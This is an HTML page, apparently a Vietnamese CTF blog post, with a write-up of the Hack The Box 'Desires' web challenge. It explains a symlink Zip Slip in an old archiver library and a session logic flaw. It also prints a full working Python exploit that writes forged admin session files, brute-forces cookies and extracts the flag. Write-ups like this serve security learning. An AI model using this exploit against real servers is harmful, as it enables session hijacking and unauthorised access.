@@ -1,0 +1,606 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto" data-theme="dark">
+
+<head><script src="/p1c0L0.github.io/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=p1c0L0.github.io/livereload" data-no-instant defer></script><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="noindex, nofollow">
+<title>Phân tích source | p1c0L0</title>
+<meta name="keywords" content="">
+<meta name="description" content="
+Phân tích source
+Main
+
+
+2 thành phần chính chạy trên Docker:
+
+Service (Golang - Port 1337): Xử lý logic chính (upload, session, giao diện)
+SSO (NodeJS - Port 8080): Xử lý đăng ký/đăng nhập, cơ sở dữ liệu user
+
+
+
+Mục tiêu: đọc nội dung file flag tại /user/admin. Endpoint này yêu cầu user phải có role: &quot;admin&quot;.
+
+
+File web_desires/challenge/service/go.mod
+
+Đoạn code: github.com/mholt/archiver/v3 v3.5.0
+Đây là một phiên bản cũ của thư viện archiver. Thư viện này nổi tiếng với lỗ hổng Zip Slip, đặc biêt là với Symlink(Liên kết mềm) cho phép ghi file ra ngoài thư mục đích
+
+File services/http.go
+
+
+Hàm UploadEngima:">
+<meta name="author" content="">
+<link rel="canonical" href="http://localhost:1313/p1c0L0.github.io/ctf/writeups/htb/">
+<link crossorigin="anonymous" href="/p1c0L0.github.io/assets/css/stylesheet.76a739ec9e19c0128deb6be5591d168c8e3b9a8640e14dc34a2f248f674ef884.css" integrity="sha256-dqc57J4ZwBKN62vlWR0WjI47moZA4U3DSi8kj2dO&#43;IQ=" rel="preload stylesheet" as="style">
+<link rel="icon" href="http://localhost:1313/p1c0L0.github.io/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/p1c0L0.github.io/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/p1c0L0.github.io/favicon-32x32.png">
+<link rel="apple-touch-icon" href="http://localhost:1313/p1c0L0.github.io/apple-touch-icon.png">
+<link rel="mask-icon" href="http://localhost:1313/p1c0L0.github.io/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="http://localhost:1313/p1c0L0.github.io/ctf/writeups/htb/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+</noscript><link rel="icon" type="image/png" sizes="32x32" href="https://dotamduc.github.io/p1c0L0.github.io/favicon.png">
+<link rel="icon" type="image/png" sizes="16x16" href="https://dotamduc.github.io/p1c0L0.github.io/favicon.png">
+<link rel="shortcut icon" href="https://dotamduc.github.io/p1c0L0.github.io/favicon.png">
+<link rel="apple-touch-icon" href="https://dotamduc.github.io/p1c0L0.github.io/favicon.png">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css" integrity="sha512-z3gLpd7yknf1YoNbCzqRKc4qyor8gaKU1qmn+CShxbuBusANI9QpRohGBreCFkKxLhei6S9CQXFEbbKuqLg0DA==" crossorigin="anonymous" referrerpolicy="no-referrer" />
+</head>
+<body id="top">
+    <header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="http://localhost:1313/p1c0L0.github.io/" accesskey="h" title="p1c0L0 (Alt + H)">p1c0L0</a>
+            <div class="logo-switches">
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="http://localhost:1313/p1c0L0.github.io/about/" title="About">
+                    <span>About</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/p1c0L0.github.io/ctf/" title="CTF">
+                    <span>CTF</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/p1c0L0.github.io/achievements/" title="Achievements">
+                    <span>Achievements</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/p1c0L0.github.io/contact/" title="Contact">
+                    <span>Contact</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    
+    <h1 class="post-title entry-hint-parent">
+      Phân tích source
+    </h1>
+    <div class="post-meta">
+
+</div>
+  </header> 
+  <div class="post-content"><p><img alt="image" loading="lazy" src="https://hackmd.io/_uploads/SyWNI1OrWx.png"></p>
+<h1 id="phân-tích-source">Phân tích source<a hidden class="anchor" aria-hidden="true" href="#phân-tích-source">#</a></h1>
+<h2 id="main">Main<a hidden class="anchor" aria-hidden="true" href="#main">#</a></h2>
+<ul>
+<li>
+<p>2 thành phần chính chạy trên Docker:</p>
+<ul>
+<li><strong>Service (Golang - Port 1337)</strong>: Xử lý logic chính (upload, session, giao diện)</li>
+<li><strong>SSO (NodeJS - Port 8080)</strong>: Xử lý đăng ký/đăng nhập, cơ sở dữ liệu user</li>
+</ul>
+</li>
+<li>
+<p>Mục tiêu: đọc nội dung file flag tại <code>/user/admin</code>. Endpoint này yêu cầu user phải có <code>role: &quot;admin&quot;</code>.</p>
+</li>
+</ul>
+<h2 id="file-web_desireschallengeservicegomod">File <code>web_desires/challenge/service/go.mod</code><a hidden class="anchor" aria-hidden="true" href="#file-web_desireschallengeservicegomod">#</a></h2>
+<ul>
+<li>Đoạn code: <code>github.com/mholt/archiver/v3 v3.5.0</code></li>
+<li>Đây là một phiên bản cũ của thư viện <code>archiver</code>. Thư viện này nổi tiếng với lỗ hổng <strong>Zip Slip</strong>, đặc biêt là với Symlink(Liên kết mềm) cho phép ghi file ra ngoài thư mục đích</li>
+</ul>
+<h2 id="file-serviceshttpgo">File <code>services/http.go</code><a hidden class="anchor" aria-hidden="true" href="#file-serviceshttpgo">#</a></h2>
+<ul>
+<li>
+<p>Hàm <code>UploadEngima</code>:</p>
+<ul>
+<li>Đoạn code:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#75715e">// Giải nén file zip người dùng upload vào thư mục userFolder</span>
+</span></span><span style="display:flex;"><span>err <span style="color:#f92672">=</span> archiver.<span style="color:#a6e22e">Unarchive</span>(tempFile, userFolder)
+</span></span></code></pre></div><ul>
+<li>Server nhận file nén từ user</li>
+<li>Gọi thẳng hàm <code>Unarchive</code> để giải nén vào <code>app/service/files/&lt;username&gt;</code></li>
+<li>Không có dòng code nào kiểm tra xem file bên trong file nén có chứa đường dẫn độc hại(như <code>../</code>) hay không trước khi giải nén. Hoàn toàn tin tưởng vào thư viện <code>archiver</code> (bản cũ)</li>
+</ul>
+</li>
+<li>
+<p>Hàm <code>LoginHandler</code>:</p>
+<ol>
+<li>Tạo Session ID:</li>
+</ol>
+<pre tabindex="0"><code class="language-java!" data-lang="java!">sessionID := fmt.Sprintf(&#34;%x&#34;, sha256.Sum256([]byte(strconv.FormatInt(time.Now().Unix(), 10))))
+</code></pre><p>=&gt; ID được tạo dựa trên thời gian thực (Unix Timestamp)
+2. Lưu vào redis (pre-auth)</p>
+<pre tabindex="0"><code class="language-java!" data-lang="java!">err := PrepareSession(sessionID, credentials.Username)
+</code></pre><p>=&gt; Lưu mapping <code>username -&gt; sessionID</code> vào redis trước khi kiểm tra mật khẩu
+3. Kiểm tra password:</p>
+<pre tabindex="0"><code class="language-java!" data-lang="java!">user, err := loginUser(credentials.Username, credentials.Password)
+if err != nil {
+    return utils.ErrorResponse(c, &#34;Invalid username or Password&#34;, http.StatusBadRequest)
+}
+</code></pre><p>=&gt; Nếu sai password, hàm trả về lỗi ngay tại đây
+4. Ghi file Session (post-auth)</p>
+<pre tabindex="0"><code class="language-java!" data-lang="java!">sessId := CreateSession(sessionID, user)
+</code></pre><p>=&gt; Chỉ khi đúng mật khẩu, server mới tạo file session trên đĩa</p>
+</li>
+</ul>
+<h1 id="vuln">Vuln<a hidden class="anchor" aria-hidden="true" href="#vuln">#</a></h1>
+<h2 id="zip-slip-via-symlink-cve-2024-0406-variant">Zip Slip via Symlink (CVE-2024-0406 variant)<a hidden class="anchor" aria-hidden="true" href="#zip-slip-via-symlink-cve-2024-0406-variant">#</a></h2>
+<ul>
+<li>Sử dụng thư viện <code>archiver v3.5.0</code> không an toàn và thiếu validate đầu vào</li>
+<li>Từ đó có thể tạo một file Zip chứa:
+<ul>
+<li>Entry 1: một symlink trỏ ra thư mục gốc (VD: <code>link -&gt; /tmp/sessions</code>)</li>
+<li>Entry 2: một file nằm trong folder symlink đó (VD: <code>link/malicious-file</code>)</li>
+</ul>
+</li>
+<li>Khi giải nén server sẽ ghi <code>malicious-file</code>  vào <code>/tmp/sessions/</code> thay vì thư mực upload quy định =&gt; <strong>Arbitrary File Write</strong></li>
+</ul>
+<h2 id="logic-flaw">Logic flaw<a hidden class="anchor" aria-hidden="true" href="#logic-flaw">#</a></h2>
+<ul>
+<li>Thứ tự thực hiện logic đăng nhập bị sai: <strong>Lưu redis -&gt; check pass -&gt; ghi file</strong>
+<ul>
+<li>Khi user gửi request login, redis được cập nhật <code>sessionID</code> mới ngay</li>
+<li>Nếu mật khẩu sai thì quá trình dừng lại, nhưng redis không bị rollback (tức là không bị xoá key vừa tạo)</li>
+<li>Ở đây thì redis trỏ tới một <code>sessionID</code> mà file session tương ứng trên đĩa chưa được tạo ra bởi server
+=&gt; Phía tấn công có thể tự tạo file session đó (bằng lỗ hổng Zip Slip ở trên) thì có thể chiếm quyền điều khiển phiên</li>
+</ul>
+</li>
+</ul>
+<h1 id="exploit">Exploit<a hidden class="anchor" aria-hidden="true" href="#exploit">#</a></h1>
+<h2 id="bước-1-dự-đoán-session-id">Bước 1: dự đoán session ID<a hidden class="anchor" aria-hidden="true" href="#bước-1-dự-đoán-session-id">#</a></h2>
+<ul>
+<li>Do Session ID dựa trên <code>time.Now().Unix()</code>, việc lệch thời gian giữa máy tấn công và server sẽ khiến exploit thất bại.
+<ul>
+<li>Gửi request <code>HEAD</code> tới server để lấy header <code>Date</code></li>
+<li>Tính độ lệch  = <code>Server Time</code> - <code>Local Time</code></li>
+<li>Điều chỉnh thời gian tấn công dựa trên độ lệch này</li>
+</ul>
+</li>
+</ul>
+<h2 id="bước-2-chuẩn-bị-payload-tương-lai">Bước 2: Chuẩn bị payload tương lai<a hidden class="anchor" aria-hidden="true" href="#bước-2-chuẩn-bị-payload-tương-lai">#</a></h2>
+<ul>
+<li>Tạo file session cho 120 giây tiếp theo (<code>payload_duration = 120</code>)</li>
+<li>Tạo một file zip đặc biệt để khai thác Zip Slip
+<ol>
+<li>
+<p>Symlink attack: <code>sess_xxx</code> -&gt; <code>../../../../tmp/sessions/{USERNAME}</code>. Dùng để trỏ vào thư mục session của user</p>
+</li>
+<li>
+<p>Symlink verify: <code>chk</code> -&gt; <code>../../static</code>. Dùng để kiểm tra xem lỗi Zip Slip có hoạt động không</p>
+</li>
+<li>
+<p>File Session: Ghi file JSON <code>{&quot;username&quot;: USERNAME, &quot;id&quot;: 1337, &quot;role&quot;: &quot;admin&quot;}</code> vào đường dẫn <code>sess_xxx/{SESSION_ID}</code></p>
+</li>
+<li>
+<p>File Verify: Ghi file <code>pwn_{user}.txt</code> vào <code>chk/</code> để kiểm tra.</p>
+</li>
+</ol>
+</li>
+</ul>
+<h2 id="bước-3-upload-payload">Bước 3: Upload payload<a hidden class="anchor" aria-hidden="true" href="#bước-3-upload-payload">#</a></h2>
+<ul>
+<li>Server giải nén (do lỗi Zip Slip) và sẽ ghi hàng loạt file session admin vào thư mục <code>/tmp/sessions/{USERNAME}/</code> tương ứng với các giây trong tương lai.</li>
+<li>Kiểm tra<code>/static/pwn_{user}.txt</code> để chắc chắn quyền ghi file hoạt động</li>
+</ul>
+<h2 id="bước-4-trigger">Bước 4: Trigger<a hidden class="anchor" aria-hidden="true" href="#bước-4-trigger">#</a></h2>
+<ul>
+<li>Thời điểm: chờ đến khi thời gian server trôi vào vùng phủ sóng của payload (sau khoảng 15s).</li>
+<li>Script spam request Login liên tục trong 30 giây</li>
+<li>Payload: <code>{ &quot;username&quot;: ..., &quot;password&quot;: &quot;WRONG_PASS&quot; }</code></li>
+<li>Vì sao SAI pass?
+<ul>
+<li>Server tạo ID theo thời gian thực (trùng với 1 file ta đã upload)</li>
+<li>Server lưu mapping <code>User -&gt; ID</code> vào redis.</li>
+<li>Server thấy sai pass -&gt; <strong>dừng lại</strong>. File session admin trên đĩa <strong>KHÔNG</strong> bị ghi đè bởi session user thường</li>
+</ul>
+</li>
+</ul>
+<p>=&gt; Redis trỏ vào ID của héc cơ, và file trên đĩa là file của héc cơ.</p>
+<h2 id="bước-5-chiếm-quyền">Bước 5: Chiếm quyền<a hidden class="anchor" aria-hidden="true" href="#bước-5-chiếm-quyền">#</a></h2>
+<ul>
+<li>Script lặp qua tất cả các Session ID đã tạo trong cửa sổ thời gian.</li>
+<li>Set cookie <code>session=&lt;POSSIBLE_ID&gt;</code></li>
+<li>Truy cập <code>/user/admin</code></li>
+<li>Nếu trúng ID mà server đã lưu vào redis ở Bước 4 -&gt; Server đọc file session admin -&gt; Trả về <strong>FLAG</strong></li>
+</ul>
+<h1 id="full-script-exploit">Full script exploit:<a hidden class="anchor" aria-hidden="true" href="#full-script-exploit">#</a></h1>
+<pre tabindex="0"><code class="language-python!" data-lang="python!">import requests
+import zipfile
+import io
+import json
+import hashlib
+import time
+import uuid
+import email.utils
+from datetime import datetime
+
+# ================= CONFIGURATION =================
+TARGET_IP = &#34;94.237.61.52&#34;
+TARGET_PORT = &#34;30394&#34;
+TARGET_URL = f&#34;http://{TARGET_IP}:{TARGET_PORT}&#34;
+# Tạo username ngẫu nhiên để tránh xung đột với các lần chạy trước
+USERNAME = f&#34;pwn_v3_{uuid.uuid4().hex[:6]}&#34; 
+PASSWORD = &#34;password123&#34;
+# =================================================
+
+def get_session_id(timestamp):
+    # Logic giống hệt server Go: SHA256 của Unix timestamp
+    return hashlib.sha256(str(timestamp).encode()).hexdigest()
+
+def get_server_time(session):
+    &#34;&#34;&#34;Lấy thời gian server từ Header Date để tính Drift&#34;&#34;&#34;
+    try:
+        r = session.head(TARGET_URL, timeout=5)
+        if &#39;Date&#39; in r.headers:
+            server_date = email.utils.parsedate_to_datetime(r.headers[&#39;Date&#39;])
+            return int(server_date.timestamp())
+    except Exception as e:
+        print(f&#34;[!] Warning: Could not get server time ({e}). Using local time.&#34;)
+    return int(time.time())
+
+def pwn():
+    s = requests.Session()
+    print(f&#34;[*] Target: {TARGET_URL}&#34;)
+    print(f&#34;[*] User:   {USERNAME}&#34;)
+
+    # 1. SETUP: Register &amp; Login
+    # Bước này tạo thư mục /app/service/files/&lt;username&gt;
+    print(&#34;[1] Setting up account...&#34;)
+    try:
+        s.post(f&#34;{TARGET_URL}/register&#34;, json={&#34;username&#34;: USERNAME, &#34;password&#34;: PASSWORD})
+        r = s.post(f&#34;{TARGET_URL}/login&#34;, json={&#34;username&#34;: USERNAME, &#34;password&#34;: PASSWORD})
+        if &#39;session&#39; not in s.cookies:
+            print(&#34;[-] Login failed. Exiting.&#34;)
+            return
+    except Exception as e:
+        print(f&#34;[-] Network error: {e}&#34;)
+        return
+
+    # 2. SYNC: Tính toán thời gian
+    print(&#34;[2] Syncing time...&#34;)
+    server_now = get_server_time(s)
+    local_now = int(time.time())
+    drift = server_now - local_now
+    print(f&#34;    Server Time: {server_now}&#34;)
+    print(f&#34;    Drift:       {drift}s&#34;)
+
+    # Chiến thuật: 
+    # - Upload payload cho khoảng thời gian: T+10 đến T+130 (120s)
+    # - Spam login trong khoảng: T+15 đến T+45 (30s)
+    # =&gt; Đảm bảo request cuối cùng LUÔN nằm trong vùng có file.
+    
+    start_offset = 15
+    payload_duration = 120 # Tạo file cho 2 phút tương lai
+    attack_duration = 30   # Chỉ tấn công trong 30s
+    
+    start_ts = server_now + start_offset
+    end_payload_ts = start_ts + payload_duration
+    end_attack_ts = start_ts + attack_duration
+
+    print(f&#34;[3] Crafting Payload (Coverage: {payload_duration}s)...&#34;)
+    
+    zip_buffer = io.BytesIO()
+    with zipfile.ZipFile(zip_buffer, &#34;w&#34;, zipfile.ZIP_DEFLATED) as zf:
+        # A. Symlink Zip Slip -&gt; /tmp/sessions/&lt;user&gt;
+        symlink_name = f&#34;sess_{uuid.uuid4().hex[:6]}&#34;
+        # ../../../.. để thoát khỏi /app/service/files/&lt;user&gt; ra root
+        zf.writestr(zipfile.ZipInfo(symlink_name), f&#34;../../../../tmp/sessions/{USERNAME}&#34;)
+        zf.getinfo(symlink_name).create_system = 3
+        zf.getinfo(symlink_name).external_attr = 0xA1ED0000
+
+        # B. Symlink Check -&gt; /app/service/static
+        # Dùng để verify xem Zip Slip có hoạt động không
+        check_link = &#34;chk&#34;
+        zf.writestr(zipfile.ZipInfo(check_link), f&#34;../../static&#34;)
+        zf.getinfo(check_link).create_system = 3
+        zf.getinfo(check_link).external_attr = 0xA1ED0000
+        
+        # C. Payload Files
+        admin_json = json.dumps({&#34;username&#34;: USERNAME, &#34;id&#34;: 1337, &#34;role&#34;: &#34;admin&#34;})
+        
+        # Tạo file session cho toàn bộ cửa sổ 120s
+        for t in range(start_ts, end_payload_ts + 1):
+            sid = get_session_id(t)
+            zf.writestr(f&#34;{symlink_name}/{sid}&#34;, admin_json)
+            
+        # File verify
+        zf.writestr(f&#34;{check_link}/pwn_{USERNAME}.txt&#34;, &#34;ZIP_SLIP_WORKS&#34;)
+
+    zip_buffer.seek(0)
+
+    # 3. UPLOAD
+    print(&#34;[4] Uploading Payload...&#34;)
+    files = {&#39;archive&#39;: (&#39;exploit.zip&#39;, zip_buffer, &#39;application/zip&#39;)}
+    r = s.post(f&#34;{TARGET_URL}/user/upload&#34;, files=files, timeout=10)
+    if r.status_code != 202:
+        print(f&#34;[-] Upload failed: {r.status_code} {r.text}&#34;)
+        return
+    print(&#34;[+] Upload successful.&#34;)
+
+    # 4. VERIFY ZIP SLIP
+    # Kiểm tra xem file pwn.txt có được ghi vào static folder không
+    print(&#34;[5] Verifying Zip Slip vulnerability...&#34;)
+    try:
+        check_r = s.get(f&#34;{TARGET_URL}/static/pwn_{USERNAME}.txt&#34;)
+        if check_r.status_code == 200 and &#34;ZIP_SLIP_WORKS&#34; in check_r.text:
+            print(&#34;[+] VULN CONFIRMED: Arbitrary File Write works!&#34;)
+        else:
+            print(&#34;[-] WARNING: Could not verify file write. Path might be wrong or permissions denied.&#34;)
+            # Vẫn tiếp tục thử tấn công vì có thể folder session ghi được còn static thì không
+    except:
+        pass
+
+    # 5. ATTACK (TRIGGER LOGIN)
+    # Chờ đến giờ G
+    wait_time = start_ts - get_server_time(s)
+    if wait_time &gt; 0:
+        print(f&#34;[*] Waiting {wait_time}s for attack window...&#34;)
+        time.sleep(wait_time)
+    
+    print(f&#34;[*] SPAMMING Login (Duration: {attack_duration}s)...&#34;)
+    
+    # Dùng session phụ để spam login
+    attacker_session = requests.Session()
+    stop_time = time.time() + attack_duration
+    req_count = 0
+    
+    while time.time() &lt; stop_time:
+        try:
+            # Gửi login với pass SAI
+            attacker_session.post(f&#34;{TARGET_URL}/login&#34;, 
+                                json={&#34;username&#34;: USERNAME, &#34;password&#34;: &#34;WRONG_PASS&#34;}, 
+                                timeout=1)
+            req_count += 1
+            # Ngủ ngắn để tránh DDOS self-dos
+            time.sleep(0.5)
+        except:
+            pass
+            
+    print(f&#34;[*] Spam finished. Sent {req_count} requests.&#34;)
+    print(&#34;[*] Checking for Flag in the debris...&#34;)
+
+    # 6. CHECK FLAG
+    # Kiểm tra tất cả các ID trong khoảng payload (vì ta không biết request cuối cùng rơi vào giây nào)
+    found = False
+    for t in range(start_ts, end_payload_ts + 1):
+        sid = get_session_id(t)
+        
+        # Forge cookie
+        s.cookies.set(&#34;session&#34;, sid, domain=TARGET_IP)
+        s.cookies.set(&#34;username&#34;, USERNAME, domain=TARGET_IP)
+        
+        try:
+            res = s.get(f&#34;{TARGET_URL}/user/admin&#34;, timeout=2)
+            if &#34;HTB{&#34; in res.text:
+                print(&#34;\n&#34; + &#34;=&#34;*50)
+                print(&#34; [!!!] FLAG FOUND [!!!]&#34;)
+                print(&#34; &#34; + res.text.strip())
+                print(&#34;=&#34;*50 + &#34;\n&#34;)
+                found = True
+                break
+        except:
+            continue
+
+    if not found:
+        print(&#34;[-] Flag still not found. Try running again immediately.&#34;)
+
+if __name__ == &#34;__main__&#34;:
+    pwn()
+</code></pre><hr>
+<h1 id="challenge-url">Challenge url: <a href="https://app.hackthebox.com/challenges/Desires">https://app.hackthebox.com/challenges/Desires</a><a hidden class="anchor" aria-hidden="true" href="#challenge-url">#</a></h1>
+<h4 id="flag-htbs0m3tim3s_its_j4ust_a_bg_m3ss">FLAG: HTB{S0m3tIm3s_Its_J4usT_A_B!G_M3ss}<a hidden class="anchor" aria-hidden="true" href="#flag-htbs0m3tim3s_its_j4ust_a_bg_m3ss">#</a></h4>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+    </ul>
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2026 <a href="http://localhost:1313/p1c0L0.github.io/">p1c0L0</a></span> · 
+
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a><canvas id="matrix-bg"></canvas>
+
+<style>
+     
+    #matrix-bg {
+        position: fixed;
+        top: 0; left: 0;
+        width: 100vw; height: 100vh;
+        z-index: -9999;  
+        pointer-events: none;
+    }
+
+     
+    .emoji-reset {
+         
+        font-family: "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol", "Noto Color Emoji", "Android Emoji", sans-serif !important;
+        
+         
+        color: initial !important; 
+        
+         
+        background: none !important; 
+        -webkit-text-fill-color: initial !important; 
+        -webkit-background-clip: border-box !important;
+
+         
+        text-shadow: none !important; 
+        
+         
+        font-style: normal !important;
+        display: inline-block !important;
+        font-weight: normal !important;
+    }
+</style>
+
+<script>
+    
+    const canvas = document.getElementById('matrix-bg');
+    const ctx = canvas.getContext('2d');
+
+    function resizeCanvas() {
+        canvas.width = window.innerWidth;
+        canvas.height = window.innerHeight;
+    }
+    window.addEventListener('resize', resizeCanvas);
+    resizeCanvas();
+
+    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@#$%^&*';
+    const fontSize = 14;
+    const columns = Math.ceil(window.innerWidth / fontSize);
+    const drops = Array(columns).fill(1);
+
+    function draw() {
+        
+        ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
+        ctx.fillRect(0, 0, canvas.width, canvas.height);
+
+        
+        ctx.fillStyle = 'rgba(0, 255, 65, 0.15)'; 
+        ctx.font = fontSize + 'px monospace';
+
+        for (let i = 0; i < drops.length; i++) {
+            const text = chars.charAt(Math.floor(Math.random() * chars.length));
+            ctx.fillText(text, i * fontSize, drops[i] * fontSize);
+
+            if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
+                drops[i] = 0;
+            }
+            drops[i]++;
+        }
+    }
+    
+    
+    ctx.fillStyle = '#000000';
+    ctx.fillRect(0, 0, canvas.width, canvas.height);
+    setInterval(draw, 35);
+
+
+    
+    document.addEventListener("DOMContentLoaded", function() {
+        
+        function rescueEmojis(node) {
+            
+            if (node.nodeType === 3) { 
+                const text = node.nodeValue;
+                
+                const emojiRegex = /[\p{Emoji_Presentation}\p{Extended_Pictographic}\u{1F300}-\u{1F6FF}\u{1F900}-\u{1F9FF}\u{2600}-\u{26FF}\u{2700}-\u{27BF}]/gu;
+                
+                if (text.match(emojiRegex)) {
+                    const span = document.createElement('span');
+                    
+                    span.innerHTML = text.replace(emojiRegex, '<span class="emoji-reset">$&</span>');
+                    node.parentNode.replaceChild(span, node);
+                }
+            } 
+            
+            else if (node.nodeType === 1 && 
+                     !['SCRIPT', 'STYLE', 'TEXTAREA', 'CODE', 'PRE'].includes(node.tagName) && 
+                     !node.classList.contains('emoji-reset')) {
+                Array.from(node.childNodes).forEach(child => rescueEmojis(child));
+            }
+        }
+        
+        
+        rescueEmojis(document.body);
+    });
+</script>
+
+<script>
+    let menu = document.getElementById('menu');
+    if (menu) {
+        
+        const scrollPosition = localStorage.getItem("menu-scroll-position");
+        if (scrollPosition) {
+            menu.scrollLeft = parseInt(scrollPosition, 10);
+        }
+        
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+</body>
+
+</html>
